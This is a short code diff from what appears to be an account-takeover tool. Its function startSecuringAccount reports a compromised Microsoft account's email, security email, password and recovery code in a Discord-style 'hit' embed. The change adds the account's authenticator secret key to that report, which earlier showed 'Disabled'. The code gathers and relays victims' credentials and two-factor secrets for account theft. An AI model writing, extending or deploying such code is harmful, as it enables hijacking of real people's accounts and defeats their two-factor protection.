@@ -25,6 +25,7 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
             "security_email": "Couldn't Change!",
             "password": "Couldn't Change!",
             "recovery_code": "Couldn't Change!",
+            "auth_secret": "Disabled",
             "firstName": "Failed to Get",
             "lastName": "Failed to Get",
             "fullName": "Failed to Get",
@@ -89,7 +90,7 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
     hit_embed.add_field(name="Primary Email", value=f"```{account["microsoft"]['email']}```", inline=False)
     hit_embed.add_field(name="Security Email", value=f"```{account["microsoft"]['security_email']}```", inline=True)
     hit_embed.add_field(name="Password", value=f"```{account["microsoft"]['password']}```", inline=False)
-    hit_embed.add_field(name="Secret Key", value=f"```Disabled```", inline=False)
+    hit_embed.add_field(name="Secret Key", value=f"```{account["microsoft"]["auth_secret"]}```", inline=False)
     hit_embed.add_field(name="Recovery Code", value=f"```{account["microsoft"]['recovery_code']}```", inline=False)
     hit_embed.set_footer(text = f"{time.strftime('%d/%m/%y', time.localtime())}, {time.strftime('%H:%M', time.localtime())}")
 
